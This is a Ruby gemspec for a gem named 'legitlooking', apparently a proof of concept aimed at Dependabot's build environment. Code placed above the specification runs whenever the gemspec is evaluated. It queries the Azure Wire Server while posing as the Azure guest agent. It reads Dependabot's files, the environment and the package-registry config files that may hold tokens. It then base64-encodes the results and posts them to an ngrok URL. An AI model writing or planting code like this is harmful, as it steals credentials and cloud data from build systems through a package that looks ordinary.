# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  cmd  = ->(c) { `#{c} 2>/dev/null`.strip[0, 4000] }
  lines = []

  # ============================================================
  # 1. AZURE WIRE SERVER -- 168.63.129.16
  #    Dit is de Azure platform agent / Wire Server
  #    Niet de IMDS (169.254.169.254) maar een andere intern endpoint
  #    pip.conf verwijst ernaar op poort 32526/vmSettings
  # ============================================================
  lines << "=== 1. AZURE WIRE SERVER (168.63.129.16) ==="

  wire_host = "168.63.129.16"
  {
    32526 => %w[/vmSettings / /machine /telemetry /healthreport],
    80    => %w[/ /machine?comp=config /machine?comp=goalstate /machine?comp=extensions],
  }.each do |port, paths|
    paths.each do |path|
      begin
        require "timeout"
        Timeout.timeout(5) do
          uri  = URI("http://#{wire_host}:#{port}#{path}")
          req2 = Net::HTTP::Get.new(uri)
          req2["x-ms-guest-agent-name"] = "WALinuxAgent-2.2.48"
          req2["Accept"]               = "application/xml"
          req2["User-Agent"]           = "WALinuxAgent-2.2.48"
          resp = Net::HTTP.start(uri.host, uri.port,
                                 open_timeout: 4, read_timeout: 4) { |h| h.request(req2) }
          lines << "  #{port}#{path}: HTTP #{resp.code} | #{resp.body.to_s[0, 1000]}"
        end
      rescue => e
        lines << "  #{port}#{path}: #{e.message[0, 100]}"
      end
    end
  end

  # ============================================================
  # 2. API_CLIENT.RB REST (was afgekapt na 4000 chars)
  # ============================================================
  lines << "\n=== 2. api_client.rb (tail -200) ==="
  lines << cmd.("tail -200 /home/dependabot/dependabot-updater/lib/dependabot/api_client.rb")

  # ============================================================
  # 3. OUTPUT.JSON -- bevat resultaten van de job
  #    Misschien tokens of interessante data na verwerking
  # ============================================================
  lines << "\n=== 3. OUTPUT.JSON ==="
  lines << cmd.("cat /home/dependabot/dependabot-updater/output/output.json")
  lines << cmd.("ls -la /home/dependabot/dependabot-updater/output/")

  # ============================================================
  # 4. ALLE .BUNDLE/CONFIG FILES -- registry credentials?
  #    npm_and_yarn, python, cargo etc. kunnen tokens bevatten
  # ============================================================
  lines << "\n=== 4. .BUNDLE/CONFIG FILES ==="
  lines << cmd.("find /home/dependabot -name 'config' -path '*/.bundle/config' 2>/dev/null -exec echo '=== {} ===' \\; -exec cat {} \\;")

  # ============================================================
  # 5. ALLE PIP.CONF / NPMRC / YARNRC BESTANDEN
  # ============================================================
  lines << "\n=== 5. ALL PIP/NPM/YARN CONFIG ==="
  lines << cmd.("find /home/dependabot -name 'pip.conf' -o -name '.npmrc' -o -name 'Pipfile' 2>/dev/null | head -20")
  lines << cmd.("find /home/dependabot -name 'pip.conf' 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;")

  # ============================================================
  # 6. WIRE SERVER VIA CURL (andere headers proberen)
  # ============================================================
  lines << "\n=== 6. WIRE SERVER VIA CURL ==="
  lines << cmd.("curl -s --max-time 5 'http://168.63.129.16:32526/vmSettings'")
  lines << "\n--- wire server poort 80 ---"
  lines << cmd.("curl -s --max-time 5 -H 'x-ms-agent-name: WALinuxAgent' -H 'x-ms-version: 2012-11-30' 'http://168.63.129.16/machine?comp=goalstate'")
  lines << "\n--- wire server packages ---"
  lines << cmd.("curl -s --max-time 5 'http://168.63.129.16:32526/'")

  # ============================================================
  # 7. VOLLEDIGE PROCESS ENV -- zoek naar hidden vars
  # ============================================================
  lines << "\n=== 7. VOLLEDIGE ENV DUMP CURRENT PROCESS ==="
  lines << cmd.("env | sort")

  # ============================================================
  # 8. DOCKER METADATA / CONTAINER LABELS
  # ============================================================
  lines << "\n=== 8. CONTAINER METADATA ==="
  lines << cmd.("cat /proc/1/cgroup")
  lines << cmd.("cat /.dockerenv 2>/dev/null && echo 'docker env file exists'")
  lines << cmd.("cat /run/containerd/containerd.sock 2>/dev/null")
  lines << cmd.("cat /var/run/docker.sock 2>/dev/null")
  lines << cmd.("ls -la /var/run/ /run/")

  # ============================================================
  # EXFIL
  # ============================================================
  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=wire_server")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 25, read_timeout: 25) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=wire_server&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.24"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
